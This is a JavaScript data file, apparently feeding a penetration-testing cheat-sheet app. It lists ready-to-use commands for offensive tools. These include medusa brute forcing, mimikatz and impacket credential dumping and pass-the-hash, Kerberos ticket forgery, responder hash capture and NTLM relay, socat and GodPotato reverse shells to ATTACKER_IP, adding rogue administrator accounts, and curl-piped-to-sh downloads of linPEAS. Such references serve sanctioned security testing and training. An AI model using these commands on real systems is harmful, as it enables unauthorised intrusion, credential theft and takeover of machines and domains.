          { label: 'FTP brute', cmd: 'medusa -h IP -u USER -P passwords.txt -M ftp' },
          { label: 'HTTP basic', cmd: 'medusa -h IP -u USER -P passwords.txt -M http' },
          { label: 'SMB brute', cmd: 'medusa -h IP -u USER -P passwords.txt -M smbnt' },
          { label: 'MySQL brute', cmd: 'medusa -h IP -u root -P passwords.txt -M mysql' },
          { label: 'RDP brute', cmd: 'medusa -h IP -u USER -P passwords.txt -M rdp' },
        ],
      },
    ],
  },

  // ─── POST-EXPLOITATION ─────────────────────────────────────────
  {
    id: 'mimikatz',
    name: 'mimikatz',
    tags: ['post-exploitation', 'windows', 'credentials', 'active directory'],
    description: 'Windows credential dumping and manipulation tool',
    categories: [
      {
        name: 'Credential Dumping',
        commands: [
          { label: 'Dump logon passwords', cmd: 'sekurlsa::logonpasswords' },
          { label: 'Dump all creds', cmd: 'sekurlsa::logonpasswordsfull' },
          { label: 'NTLM hashes', cmd: 'lsadump::sam' },
          { label: 'Domain creds', cmd: 'lsadump::lsa /patch' },
          { label: 'DC sync (KRBTGT)', cmd: 'lsadump::dcsync /user:krbtgt' },
          { label: 'DC sync (all)', cmd: 'lsadump::dcsync /domain:DOMAIN /all /csv' },
        ],
      },
      {
        name: 'Pass-the-Hash',
        commands: [
          { label: 'PTH (cmd)', cmd: 'sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:cmd.exe' },
          { label: 'PTH (PS)', cmd: 'sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell.exe' },
        ],
      },
      {
        name: 'Kerberos',
        commands: [
          { label: 'List tickets', cmd: 'kerberos::list' },
          { label: 'Export tickets', cmd: 'kerberos::list /export' },
          { label: 'Golden ticket', cmd: 'kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:NTHASH /ticket:golden.kirbi' },
          { label: 'Pass-the-ticket', cmd: 'kerberos::ptt golden.kirbi' },
        ],
      },
    ],
  },
  {
    id: 'winpeas',
    name: 'winPEAS',
    tags: ['post-exploitation', 'windows', 'privilege escalation', 'enumeration'],
    description: 'Windows Privilege Escalation Awesome Scripts',
    categories: [
      {
        name: 'Execution',
        commands: [
          { label: 'Full enum', cmd: 'winpeas.exe' },
          { label: 'Color output', cmd: 'winpeas.exe color' },
          { label: 'Specific check', cmd: 'winpeas.exe systeminfo' },
          { label: 'Save output', cmd: 'winpeas.exe > output.txt' },
          { label: 'PowerShell version', cmd: 'powershell -ep bypass -c ". .\\winPEASps1.ps1"' },
        ],
      },
      {
        name: 'Specific Checks',
        commands: [
          { label: 'System info', cmd: 'winpeas.exe systeminfo' },
          { label: 'User/group info', cmd: 'winpeas.exe userinfo' },
          { label: 'Services', cmd: 'winpeas.exe servicesinfo' },
          { label: 'Applications', cmd: 'winpeas.exe applicationsinfo' },
          { label: 'Network info', cmd: 'winpeas.exe networkinfo' },
          { label: 'Windows creds', cmd: 'winpeas.exe windowscreds' },
        ],
      },
    ],
  },
  {
    id: 'linpeas',
    name: 'linPEAS',
    tags: ['post-exploitation', 'linux', 'privilege escalation', 'enumeration'],
    description: 'Linux Privilege Escalation Awesome Script',
    categories: [
      {
        name: 'Execution',
        commands: [
          { label: 'Full enum', cmd: 'bash linpeas.sh' },
          { label: 'From curl', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
          { label: 'Save output', cmd: 'bash linpeas.sh | tee linpeas_output.txt' },
          { label: 'In memory', cmd: 'curl -L https://linpeas.sh | sh' },
        ],
      },
      {
        name: 'Specific Checks',
        commands: [
          { label: 'SUID files', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
          { label: 'Sudo rights', cmd: 'sudo -l' },
          { label: 'Writable files', cmd: 'find / -writable -type f 2>/dev/null | grep -v proc' },
          { label: 'Cron jobs', cmd: 'cat /etc/crontab && ls -la /etc/cron.*/' },
          { label: 'Capabilities', cmd: 'getcap -r / 2>/dev/null' },
        ],
      },
    ],
  },

  // ─── NETWORK ───────────────────────────────────────────────────
  {
    id: 'tcpdump',
    name: 'tcpdump',
    tags: ['network', 'capture', 'traffic analysis'],
    description: 'Command-line packet capture and analysis',
    categories: [
      {
        name: 'Capture',
        commands: [
          { label: 'All interfaces', cmd: 'tcpdump -i any' },
          { label: 'Specific interface', cmd: 'tcpdump -i eth0' },
          { label: 'Save to PCAP', cmd: 'tcpdump -i eth0 -w capture.pcap' },
          { label: 'Read PCAP', cmd: 'tcpdump -r capture.pcap' },
          { label: 'Verbose', cmd: 'tcpdump -i eth0 -vvv' },
        ],
      },
      {
        name: 'Filtering',
        commands: [
          { label: 'By host', cmd: 'tcpdump -i eth0 host IP' },
          { label: 'By port', cmd: 'tcpdump -i eth0 port PORT' },
          { label: 'HTTP traffic', cmd: 'tcpdump -i eth0 port 80 or port 443' },
          { label: 'By protocol', cmd: 'tcpdump -i eth0 icmp' },
          { label: 'Source host', cmd: 'tcpdump -i eth0 src IP' },
          { label: 'Dest host', cmd: 'tcpdump -i eth0 dst IP' },
          { label: 'Complex filter', cmd: 'tcpdump -i eth0 "host IP and port PORT"' },
        ],
      },
    ],
  },
  {
    id: 'tshark',
    name: 'tshark',
    tags: ['network', 'capture', 'traffic analysis', 'wireshark'],
    description: 'Wireshark CLI — terminal packet capture and analysis',
    categories: [
      {
        name: 'Capture',
        commands: [
          { label: 'List interfaces', cmd: 'tshark -D' },
          { label: 'Capture on interface', cmd: 'tshark -i eth0' },
          { label: 'Save to PCAP', cmd: 'tshark -i eth0 -w capture.pcap' },
          { label: 'Read PCAP', cmd: 'tshark -r capture.pcap' },
          { label: 'Packet count', cmd: 'tshark -r capture.pcap | wc -l' },
        ],
      },
      {
        name: 'Filtering & Analysis',
        commands: [
          { label: 'Display filter', cmd: 'tshark -r capture.pcap -Y "http"' },
          { label: 'HTTP creds', cmd: 'tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data' },
          { label: 'FTP creds', cmd: 'tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg' },
          { label: 'DNS queries', cmd: 'tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name' },
          { label: 'Follow TCP stream', cmd: 'tshark -r capture.pcap -z follow,tcp,ascii,STREAM_NUMBER -q' },
        ],
      },
    ],
  },
  {
    id: 'arp-scan',
    name: 'arp-scan',
    tags: ['network', 'recon', 'discovery'],
    description: 'ARP-based local network host discovery',
    categories: [
      {
        name: 'Host Discovery',
        commands: [
          { label: 'Local network', cmd: 'arp-scan --localnet' },
          { label: 'Specific range', cmd: 'arp-scan CIDR/24' },
          { label: 'Specific interface', cmd: 'arp-scan -I eth0 --localnet' },
          { label: 'Custom timeout', cmd: 'arp-scan --localnet -t 500' },
          { label: 'Verbose', cmd: 'arp-scan --localnet -v' },
        ],
      },
    ],
  },

  // ─── EXTRA TOOLS ───────────────────────────────────────────────
  {
    id: 'rpcclient',
    name: 'rpcclient',
    tags: ['enumeration', 'smb', 'windows', 'active directory'],
    description: 'MS-RPC client for Windows enumeration',
    categories: [
      {
        name: 'Connection',
        commands: [
          { label: 'Null session', cmd: 'rpcclient -U "" -N IP' },
          { label: 'With creds', cmd: 'rpcclient -U "USER%PASS" IP' },
        ],
      },
      {
        name: 'Enumeration Commands',
        commands: [
          { label: 'Enum users', cmd: 'enumdomusers' },
          { label: 'Enum groups', cmd: 'enumdomgroups' },
          { label: 'User info', cmd: 'queryuser RID' },
          { label: 'Domain info', cmd: 'querydominfo' },
          { label: 'Server info', cmd: 'srvinfo' },
          { label: 'List shares', cmd: 'netshareenumall' },
        ],
      },
    ],
  },
  {
    id: 'ldapdomaindump',
    name: 'ldapdomaindump',
    tags: ['enumeration', 'active directory', 'ldap'],
    description: 'LDAP domain dump for Active Directory recon',
    categories: [
      {
        name: 'Domain Dumping',
        commands: [
          { label: 'Basic dump', cmd: 'ldapdomaindump -u "DOMAIN\\\\USER" -p PASS ldap://IP' },
          { label: 'LDAPS', cmd: 'ldapdomaindump -u "DOMAIN\\\\USER" -p PASS ldaps://IP' },
          { label: 'Output dir', cmd: 'ldapdomaindump -u "DOMAIN\\\\USER" -p PASS ldap://IP -o /tmp/ldd_output/' },
          { label: 'Anonymous', cmd: 'ldapdomaindump ldap://IP' },
        ],
      },
    ],
  },

  // ─── IMPACKET SUITE ────────────────────────────────────────────
  {
    id: 'impacket',
    name: 'impacket',
    tags: ['exploitation', 'post-exploitation', 'active directory', 'windows', 'lateral movement'],
    description: 'Python AD/network attack toolkit — psexec, secretsdump, kerberoast, relay',
    categories: [
      {
        name: 'Remote Execution',
        commands: [
          { label: 'PsExec shell', cmd: 'impacket-psexec DOMAIN/USER:PASS@IP' },
          { label: 'PsExec with hash', cmd: 'impacket-psexec -hashes :NTHASH DOMAIN/USER@IP' },
          { label: 'SMBExec', cmd: 'impacket-smbexec DOMAIN/USER:PASS@IP' },
          { label: 'WMIExec', cmd: 'impacket-wmiexec DOMAIN/USER:PASS@IP' },
          { label: 'ATExec (task)', cmd: 'impacket-atexec DOMAIN/USER:PASS@IP whoami' },
        ],
      },
      {
        name: 'Credential Dumping',
        commands: [
          { label: 'Dump SAM + NTDS', cmd: 'impacket-secretsdump DOMAIN/USER:PASS@IP' },
          { label: 'Dump with hash', cmd: 'impacket-secretsdump -hashes :NTHASH DOMAIN/USER@IP' },
          { label: 'DC dump (DCSync)', cmd: 'impacket-secretsdump -just-dc DOMAIN/USER:PASS@DC_IP' },
          { label: 'Dump NTDS.dit local', cmd: 'impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL' },
        ],
      },
      {
        name: 'Kerberos Attacks',
        commands: [
          { label: 'AS-REP Roasting', cmd: 'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -outputfile asrep.txt' },
          { label: 'Kerberoasting', cmd: 'impacket-GetUserSPNs DOMAIN/USER:PASS -request -outputfile kerb.txt' },
          { label: 'Get TGT', cmd: 'impacket-getTGT DOMAIN/USER:PASS' },
          { label: 'Get ST (service)', cmd: 'impacket-getST -dc-ip DC_IP DOMAIN/USER:PASS -spn cifs/TARGET' },
        ],
      },
      {
        name: 'NTLM Relay',
        commands: [
          { label: 'NTLM relay setup', cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support' },
          { label: 'Relay to LDAP', cmd: 'impacket-ntlmrelayx -t ldap://DC_IP --delegate-access' },
          { label: 'Interactive shell', cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support -i' },
          { label: 'Execute command', cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"' },
        ],
      },
      {
        name: 'Other',
        commands: [
          { label: 'SMB client', cmd: 'impacket-smbclient DOMAIN/USER:PASS@IP' },
          { label: 'LDAP query', cmd: 'impacket-ldapdomaindump DOMAIN/USER:PASS@IP' },
          { label: 'Reg query', cmd: 'impacket-reg DOMAIN/USER:PASS@IP query -keyName "HKLM\\SAM"' },
          { label: 'Lookupsid (RID)', cmd: 'impacket-lookupsid DOMAIN/USER:PASS@IP' },
        ],
      },
    ],
  },

  // ─── RESPONDER ─────────────────────────────────────────────────
  {
    id: 'responder',
    name: 'responder',
    tags: ['exploitation', 'network', 'active directory', 'lateral movement'],
    description: 'LLMNR/NBT-NS poisoner — captures NTLMv2 hashes on the network',
    categories: [
      {
        name: 'Poisoning',
        commands: [
          { label: 'Start responder', cmd: 'responder -I eth0' },
          { label: 'With WPAD', cmd: 'responder -I eth0 -w' },
          { label: 'Analyze only (no poison)', cmd: 'responder -I eth0 -A' },
          { label: 'Disable SMB/HTTP', cmd: 'responder -I eth0 -r -d' },
          { label: 'Behind proxy', cmd: 'responder -I eth0 -P' },
        ],
      },
      {
        name: 'Post-Capture',
        commands: [
          { label: 'View captured hashes', cmd: 'cat /usr/share/responder/logs/SMB-NTLMv2-*.txt' },
          { label: 'Crack with hashcat', cmd: 'hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt' },
          { label: 'Crack with john', cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt captured_hashes.txt' },
        ],
      },
    ],
  },

  // ─── BLOODHOUND ────────────────────────────────────────────────
  {
    id: 'bloodhound',
    name: 'bloodhound',
    tags: ['enumeration', 'active directory', 'recon'],
    description: 'AD attack path visualizer — find paths to Domain Admin',
    categories: [
      {
        name: 'Data Collection',
        commands: [
          { label: 'SharpHound (all)', cmd: 'SharpHound.exe -c All' },
          { label: 'SharpHound (stealth)', cmd: 'SharpHound.exe -c All --stealth' },
          { label: 'Python collector', cmd: 'bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All' },
          { label: 'Python via LDAPS', cmd: 'bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All --use-ldaps' },
        ],
      },
      {
        name: 'Cypher Queries',
        commands: [
          { label: 'Shortest path to DA', cmd: 'MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN"})) RETURN p' },
          { label: 'All DA paths', cmd: 'MATCH (n:User),(m:Group {name:"DOMAIN ADMINS@DOMAIN"}),p=shortestPath((n)-[*1..]->(m)) RETURN p' },
          { label: 'Kerberoastable users', cmd: 'MATCH (u:User {hasspn:true}) RETURN u.name,u.serviceprincipalnames' },
          { label: 'AS-REP roastable', cmd: 'MATCH (u:User {dontreqpreauth:true}) RETURN u.name' },
        ],
      },
    ],
  },

  // ─── WAFW00F ───────────────────────────────────────────────────
  {
    id: 'wafw00f',
    name: 'wafw00f',
    tags: ['recon', 'web', 'enumeration'],
    description: 'Web Application Firewall detection tool',
    categories: [
      {
        name: 'WAF Detection',
        commands: [
          { label: 'Basic detect', cmd: 'wafw00f https://TARGET' },
          { label: 'Aggressive mode', cmd: 'wafw00f -a https://TARGET' },
          { label: 'List signatures', cmd: 'wafw00f -l' },
          { label: 'Multiple targets', cmd: 'wafw00f -i targets.txt' },
          { label: 'JSON output', cmd: 'wafw00f -o results.json https://TARGET' },
        ],
      },
    ],
  },

  // ─── DNSRECON ──────────────────────────────────────────────────
  {
    id: 'dnsrecon',
    name: 'dnsrecon',
    tags: ['recon', 'dns', 'enumeration'],
    description: 'DNS enumeration — zone transfers, brute force, reverse lookup',
    categories: [
      {
        name: 'Enumeration',
        commands: [
          { label: 'Standard enum', cmd: 'dnsrecon -d DOMAIN -t std' },
          { label: 'Zone transfer', cmd: 'dnsrecon -d DOMAIN -t axfr' },
          { label: 'Subdomain brute', cmd: 'dnsrecon -d DOMAIN -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
          { label: 'Reverse lookup', cmd: 'dnsrecon -r CIDR/24 -t rvl' },
          { label: 'Google dorks', cmd: 'dnsrecon -d DOMAIN -t goo' },
          { label: 'Save XML', cmd: 'dnsrecon -d DOMAIN -t std --xml output.xml' },
        ],
      },
    ],
  },

  // ─── DALFOX ────────────────────────────────────────────────────
  {
    id: 'dalfox',
    name: 'dalfox',
    tags: ['exploitation', 'web', 'xss'],
    description: 'Fast XSS scanner — reflected, DOM, stored detection',
    categories: [
      {
        name: 'XSS Scanning',
        commands: [
          { label: 'Single URL', cmd: 'dalfox url "https://TARGET/page?q=test"' },
          { label: 'Pipe from stdin', cmd: 'echo "https://TARGET/page?q=test" | dalfox pipe' },
          { label: 'Multiple URLs', cmd: 'dalfox file urls.txt' },
          { label: 'Custom param', cmd: 'dalfox url "https://TARGET/page" -p "search,id,q"' },
          { label: 'With cookie', cmd: 'dalfox url "https://TARGET/page?id=1" --cookie "session=SESSIONID"' },
          { label: 'JSON output', cmd: 'dalfox url "https://TARGET/page?q=1" --json -o results.json' },
          { label: 'Blind XSS', cmd: 'dalfox url "https://TARGET/page?q=1" -b "https://YOUR_BLIND_XSS_SERVER"' },
        ],
      },
    ],
  },

  // ─── SEARCHSPLOIT ──────────────────────────────────────────────
  {
    id: 'searchsploit',
    name: 'searchsploit',
    tags: ['exploitation', 'recon'],
    description: 'Exploit-DB offline search — find public exploits for software versions',
    categories: [
      {
        name: 'Searching',
        commands: [
          { label: 'Basic search', cmd: 'searchsploit apache 2.4' },
          { label: 'Exact phrase', cmd: 'searchsploit -e "windows 10 privilege"' },
          { label: 'Search CVE', cmd: 'searchsploit --cve CVE-2021-44228' },
          { label: 'Exclude results', cmd: 'searchsploit apache --exclude="(DoS)"' },
          { label: 'Web links', cmd: 'searchsploit -w apache 2.4' },
        ],
      },
      {
        name: 'Exploit Management',
        commands: [
          { label: 'Mirror exploit', cmd: 'searchsploit -m EDB_ID' },
          { label: 'View exploit', cmd: 'searchsploit -x EDB_ID' },
          { label: 'Update DB', cmd: 'searchsploit -u' },
          { label: 'JSON output', cmd: 'searchsploit -j apache 2.4 > results.json' },
        ],
      },
    ],
  },

  // ─── SOCAT ─────────────────────────────────────────────────────
  {
    id: 'socat',
    name: 'socat',
    tags: ['exploitation', 'network', 'post-exploitation'],
    description: 'Multipurpose relay — stable TTY shells, tunnels, port forwards',
    categories: [
      {
        name: 'Stable Shells',
        commands: [
          { label: 'Attacker listener (TTY)', cmd: 'socat file:`tty`,raw,echo=0 tcp-listen:PORT' },
          { label: 'Victim connect (TTY)', cmd: 'socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT' },
          { label: 'Windows reverse shell', cmd: 'socat tcp-connect:ATTACKER_IP:PORT exec:cmd.exe,pipes' },
        ],
      },
      {
        name: 'Port Forwarding',
        commands: [
          { label: 'Forward local→remote', cmd: 'socat tcp-listen:LOCAL_PORT,fork tcp:REMOTE_IP:REMOTE_PORT' },
          { label: 'Bidirectional tunnel', cmd: 'socat tcp-listen:PORT1,fork tcp:TARGET:PORT2' },
          { label: 'UDP→TCP', cmd: 'socat udp-listen:PORT,fork tcp:TARGET:PORT' },
        ],
      },
      {
        name: 'File Transfer',
        commands: [
          { label: 'Receive file', cmd: 'socat tcp-listen:PORT > received_file' },
          { label: 'Send file', cmd: 'socat tcp:TARGET:PORT < file_to_send' },
        ],
      },
    ],
  },

  // ─── PRINTSPOOFER / POTATOES ───────────────────────────────────
  {
    id: 'printspoofer',
    name: 'PrintSpoofer / Potatoes',
    tags: ['post-exploitation', 'windows', 'privilege escalation'],
    description: 'SeImpersonate/SeAssignPrimaryToken token abuse for SYSTEM on Windows',
    categories: [
      {
        name: 'PrintSpoofer',
        commands: [
          { label: 'Interactive SYSTEM', cmd: 'PrintSpoofer.exe -i -c cmd.exe' },
          { label: 'Execute as SYSTEM', cmd: 'PrintSpoofer.exe -c "net localgroup administrators USER /add"' },
          { label: 'Reverse shell', cmd: 'PrintSpoofer.exe -c "C:\\tmp\\reverse.exe"' },
        ],
      },
      {
        name: 'JuicyPotato',
        commands: [
          { label: 'SYSTEM shell', cmd: 'JuicyPotato.exe -l 1337 -p "C:\\Windows\\System32\\cmd.exe" -a "/c whoami" -t *' },
          { label: 'Add admin user', cmd: 'JuicyPotato.exe -l 1337 -p cmd.exe -a "/c net user hacker P@ss123 /add && net localgroup administrators hacker /add" -t *' },
          { label: 'Custom CLSID', cmd: 'JuicyPotato.exe -l 1337 -p cmd.exe -c "{CLSID}" -t *' },
        ],
      },
      {
        name: 'GodPotato',
        commands: [
          { label: 'Run command', cmd: 'GodPotato.exe -cmd "net user hacker P@ss123 /add"' },
          { label: 'Reverse shell', cmd: 'GodPotato.exe -cmd "C:\\tmp\\nc.exe -e cmd.exe ATTACKER_IP PORT"' },
        ],
      },
      {
        name: 'SweetPotato',
        commands: [
          { label: 'Execute binary', cmd: 'SweetPotato.exe -a "C:\\tmp\\reverse.exe"' },
          { label: 'Base64 PS', cmd: 'SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a "-EncodedCommand BASE64CMD"' },
        ],
      },
    ],
  },

  // ─── POWERUP / SEATBELT ────────────────────────────────────────
  {
    id: 'powerup',
    name: 'PowerUp / Seatbelt',
    tags: ['post-exploitation', 'windows', 'privilege escalation', 'enumeration'],
    description: 'PowerShell Windows privesc enumeration modules',
    categories: [
      {
        name: 'PowerUp',
        commands: [
          { label: 'Load + all checks', cmd: 'Import-Module PowerUp.ps1; Invoke-AllChecks' },
          { label: 'Unquoted service paths', cmd: 'Get-UnquotedService' },
          { label: 'Modifiable services', cmd: 'Get-ModifiableService' },
          { label: 'Modifiable service binaries', cmd: 'Get-ModifiableServiceBinary' },
          { label: 'AlwaysInstallElevated', cmd: 'Get-RegistryAlwaysInstallElevated' },
          { label: 'Weak registry perms', cmd: 'Get-ModifiableRegistryAutoRun' },
          { label: 'Abuse unquoted path', cmd: 'Write-ServiceBinary -Name "SERVICENAME" -Path "C:\\Program Files\\VULN PATH\\malicious.exe"' },
        ],
      },
      {
        name: 'Seatbelt',
        commands: [
          { label: 'All checks', cmd: 'Seatbelt.exe -group=all' },
          { label: 'System checks', cmd: 'Seatbelt.exe -group=system' },
          { label: 'User checks', cmd: 'Seatbelt.exe -group=user' },
          { label: 'Remote system', cmd: 'Seatbelt.exe -group=all -computername=TARGET -username=USER -password=PASS' },
        ],
      },
    ],
  },

  // ─── PSPY ──────────────────────────────────────────────────────
  {
    id: 'pspy',
    name: 'pspy',
    tags: ['post-exploitation', 'linux', 'enumeration'],
    description: 'Unprivileged Linux process monitor — catch cron jobs and running processes',
    categories: [
      {
        name: 'Process Monitoring',
        commands: [
          { label: 'Monitor all processes', cmd: './pspy64' },
          { label: 'Include file events', cmd: './pspy64 -f' },
          { label: 'Custom interval (ms)', cmd: './pspy64 -i 500' },
          { label: 'Filter cron', cmd: './pspy64 | grep -i cron' },
          { label: 'Log to file', cmd: './pspy64 | tee pspy_output.txt' },
          { label: '32-bit version', cmd: './pspy32' },
        ],
      },
    ],
  },

  // ─── SMTP-USER-ENUM ────────────────────────────────────────────
  {
    id: 'smtp-user-enum',
    name: 'smtp-user-enum',
    tags: ['enumeration', 'network'],
    description: 'SMTP user enumeration via VRFY, EXPN, RCPT commands',
    categories: [
      {
        name: 'User Enumeration',
        commands: [
          { label: 'VRFY method', cmd: 'smtp-user-enum -M VRFY -U users.txt -t IP' },
          { label: 'EXPN method', cmd: 'smtp-user-enum -M EXPN -U users.txt -t IP' },
          { label: 'RCPT method', cmd: 'smtp-user-enum -M RCPT -U users.txt -t IP' },
          { label: 'Custom port', cmd: 'smtp-user-enum -M VRFY -U users.txt -t IP -p 587' },
          { label: 'Single user', cmd: 'smtp-user-enum -M VRFY -u root -t IP' },
        ],
      },
    ],
  },

  // ─── ENUM4LINUX-NG ─────────────────────────────────────────────
  {
    id: 'enum4linux-ng',
    name: 'enum4linux-ng',
    tags: ['enumeration', 'smb', 'windows'],
    description: 'Rewrite of enum4linux with YAML/JSON output and better null session support',
    categories: [
      {
        name: 'Enumeration',
        commands: [
          { label: 'Full scan', cmd: 'enum4linux-ng IP' },
          { label: 'Aggressive', cmd: 'enum4linux-ng -A IP' },
          { label: 'With creds', cmd: 'enum4linux-ng -u USER -p PASS IP' },
          { label: 'Users only', cmd: 'enum4linux-ng -U IP' },
          { label: 'Shares only', cmd: 'enum4linux-ng -S IP' },
          { label: 'YAML output', cmd: 'enum4linux-ng -oY results IP' },
          { label: 'JSON output', cmd: 'enum4linux-ng -oJ results IP' },
        ],
      },
    ],
  },

  // ─── CLOUD ENUM ────────────────────────────────────────────────
  {
    id: 'cloud-enum',
    name: 'cloud_enum / s3scanner',
    tags: ['recon', 'cloud', 'enumeration'],
    description: 'Cloud asset discovery — AWS S3, Azure blobs, GCP buckets',
    categories: [
      {
        name: 'cloud_enum',
        commands: [
          { label: 'All cloud providers', cmd: 'cloud_enum -k COMPANY_NAME' },
          { label: 'AWS only', cmd: 'cloud_enum -k COMPANY_NAME -p aws' },
          { label: 'Azure only', cmd: 'cloud_enum -k COMPANY_NAME -p azure' },
          { label: 'GCP only', cmd: 'cloud_enum -k COMPANY_NAME -p gcp' },
          { label: 'Custom wordlist', cmd: 'cloud_enum -k COMPANY_NAME -kf keywords.txt' },
        ],
      },
      {
        name: 's3scanner',
        commands: [
          { label: 'Scan bucket', cmd: 's3scanner scan -b BUCKET_NAME' },
          { label: 'Scan list', cmd: 's3scanner scan -l buckets.txt' },
          { label: 'Dump accessible', cmd: 's3scanner dump -b BUCKET_NAME' },
          { label: 'All regions', cmd: 's3scanner scan -b BUCKET_NAME --include-closed' },
        ],
      },
      {
        name: 'AWS CLI Recon',
        commands: [
          { label: 'List buckets', cmd: 'aws s3 ls --no-sign-request' },
          { label: 'List bucket contents', cmd: 'aws s3 ls s3://BUCKET_NAME --no-sign-request' },
          { label: 'Download bucket', cmd: 'aws s3 sync s3://BUCKET_NAME . --no-sign-request' },
          { label: 'Check EC2 metadata', cmd: 'curl http://169.254.169.254/latest/meta-data/' },
          { label: 'IMDSv2 token', cmd: 'TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") && curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/' },
        ],
      },
    ],
  },

  // ─── HTTPROBE / HTTPX ──────────────────────────────────────────
  {
    id: 'httpx',
    name: 'httpx / httprobe',
    tags: ['recon', 'web', 'enumeration'],
    description: 'Probe domains for live HTTP/HTTPS servers at scale',
    categories: [
      {
        name: 'httpx',
        commands: [
          { label: 'Probe subdomains', cmd: 'cat subdomains.txt | httpx' },
          { label: 'Custom ports', cmd: 'cat subdomains.txt | httpx -ports 80,443,8080,8443,3000,8000' },
          { label: 'Show status + title', cmd: 'cat subdomains.txt | httpx -status-code -title' },
          { label: 'Tech detection', cmd: 'cat subdomains.txt | httpx -tech-detect' },
          { label: 'Screenshot', cmd: 'cat subdomains.txt | httpx -screenshot -o screenshots/' },
          { label: 'Full recon', cmd: 'cat subdomains.txt | httpx -status-code -title -tech-detect -content-length -o results.txt' },
        ],
      },
      {
        name: 'httprobe',
        commands: [
          { label: 'Basic probe', cmd: 'cat domains.txt | httprobe' },
          { label: 'Custom ports', cmd: 'cat domains.txt | httprobe -p http:8080 -p https:8443' },
          { label: 'Concurrency', cmd: 'cat domains.txt | httprobe -c 50' },
          { label: 'Prefer HTTPS', cmd: 'cat domains.txt | httprobe --prefer-https' },
        ],
      },
    ],
  },

  // ─── NUCLEI ────────────────────────────────────────────────────
  {
    id: 'nuclei',
    name: 'nuclei',
    tags: ['exploitation', 'web', 'vulnerability', 'scanning'],
    description: 'Template-based vulnerability scanner — 10k+ CVE/misconfig templates',
    categories: [
      {
        name: 'Basic Scanning',
        commands: [
          { label: 'Scan single target', cmd: 'nuclei -u https://TARGET' },
          { label: 'Scan file of URLs', cmd: 'nuclei -l urls.txt' },
          { label: 'Scan with all templates', cmd: 'nuclei -u https://TARGET -t /root/nuclei-templates/' },
          { label: 'Critical severity only', cmd: 'nuclei -u https://TARGET -severity critical,high' },
          { label: 'Update templates', cmd: 'nuclei -update-templates' },
        ],
      },
      {
        name: 'Template Categories',
        commands: [
          { label: 'CVE templates', cmd: 'nuclei -u https://TARGET -t cves/' },
          { label: 'Misconfigurations', cmd: 'nuclei -u https://TARGET -t misconfiguration/' },
          { label: 'Exposed panels', cmd: 'nuclei -u https://TARGET -t exposed-panels/' },
          { label: 'Default credentials', cmd: 'nuclei -u https://TARGET -t default-credentials/' },
          { label: 'Subdomain takeover', cmd: 'nuclei -l subdomains.txt -t takeovers/' },
          { label: 'Network templates', cmd: 'nuclei -target IP -t network/' },
        ],
      },
      {
        name: 'Output & Rate',
        commands: [
          { label: 'JSON output', cmd: 'nuclei -u https://TARGET -json -o results.json' },
          { label: 'Rate limit', cmd: 'nuclei -l urls.txt -rate-limit 50 -concurrency 25' },
          { label: 'Silent mode', cmd: 'nuclei -l urls.txt -silent -o results.txt' },
        ],
      },
    ],
  },
]
